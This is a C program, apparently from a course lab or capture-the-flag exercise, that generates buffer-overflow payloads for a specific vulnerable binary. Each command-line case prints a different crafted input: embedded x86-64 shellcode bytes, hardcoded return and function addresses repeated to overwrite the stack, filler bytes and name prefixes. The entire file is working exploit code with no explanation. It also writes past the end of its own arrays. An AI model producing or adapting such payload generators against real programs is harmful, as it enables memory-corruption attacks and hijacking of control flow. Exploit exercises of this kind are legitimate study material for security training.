#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(char argc, char *argv[]){
  int i = 0;
  char malbuf[120];
  char malbufc[80];
  char malbufa[120] = "\xc6\x05\xb9\xff\xff\xff\x41" 
    "\x48\xc7\xc0\x25\x08\x40\x00\xff\xe0";
  char malbufb[120] = "\xc6\x05\xb9\xff\xff\xff\x42" 
    "\x48\xc7\xc0\x25\x08\x40\x00\xff\xe0";
  if(argc>1){
    switch(argv[1][0]){
    case 'a':
      /* Filling address of f() */
      for(i=16;i<67;i+=4){
	*(long *) &malbufb[i]=4196441;
	malbufa[i+3]='b';
      }
      *(long *) &malbufa[i]=4196441;
      i+=4;
      for(;i<84;i++){
	malbufa[i]=0;
      }
      *(long *) &malbufa[i]=4196441;
      i+=4;
      for(;i<100;i++){
	malbufa[i]=0;
      }
      *(long *) &malbufa[i]=4196441;
      i+=4;
      for(;i<116;i++){
	malbufa[i]=0;
      }
      /* Filling address of return*/
       *(long *) &malbufa[i]=6294980;
       i+=4;
      for(;i<132;i++){
	malbufa[i]=0;
      }
      *(long *) &malbufa[i]=6294980;
      i+=4;
      for(;i<148;i++){
	malbufa[i]=0;
      }
      *(long *) &malbufa[i]=6294980;
      i+=4;
      for(;i<156;i++){
	malbufa[i]=0;
      }
      write(1,"Adi\0",4);
      for(i=0;i<156;i++){
	putchar(malbufa[i]);
      }
      break;
    
    case 'b':
      
      for(i=16;i<67;i+=4){
	*(long *) &malbufb[i]=4196441;
	malbufb[i+3]='b';
      }
      *(long *) &malbufb[i]=4196441;
      i+=4;
      for(;i<80;i++){
	malbufb[i]=0;
      }
      
      for(i=0;i<36;i+=4){
	*(long *) &malbufc[i]=6294980;
	malbufc[i+3]='c';
      }
      *(long *) &malbufc[i]=6294980;
      
      i+=4;
      
      for(;i<44;i++){
	malbufc[i]=0;
      }
            
      write(1,"Adi\0",4);
      for(i=0;i<80;i++){
	putchar(malbufb[i]);
      }
      printf("%s\n",malbufc);
      break;
    
    case 'c':
      
      for(i=0;i<67;i+=4){
	*(long *) &malbuf[i]=4196441;
	malbuf[i+3]='b';
      }
      *(long *) &malbuf[i]=4196441;
      i+=4;
      for(;i<80;i++){
      malbuf[i]=0;
      }
      //*(long *) &malbuf[i]=4196441;
      
      
      for(i=0;i<36;i+=4){
	*(long *) &malbufc[i]=4196382;
	malbufc[i+3]='c';
      }
      *(long *) &malbufc[i]=4196382;
      
      i+=4;
      
      for(;i<44;i++){
	malbufc[i]=0;
      }
            
      write(1,"Adi\0",4);
      write(1,malbuf,80);
      //write(1,malbufc,44);
      printf("%s\n",malbufc);
      break;
    
    case 'd':
      for(i=0;i<64;i++){
	malbuf[i]='d';
      }
      *(long *) &malbuf[i] = 0x4007b8;
      write(1,"Shivaji\0",8);
      printf("%s\n",malbuf);
      break; 
    
    case 'e':
      for(i=0;i<73;i++){
	malbuf[i]='e';
      }
      printf("%s\n",malbuf);
      break;
      
    case 's':
      for(i=0;i<100;i+=4){
	*(long *) &malbuf[i]=4204771;
	malbuf[i+3]='b';
      }
      *(long *) &malbuf[i]=4204771;
      write(1,"Adi\0",4);
      write(1,malbuf,104);
      printf("\n");
      break;
    default:
      printf("Sanskruti\n");
    }
  }else{
    printf("Shivaji\n");
  }
}
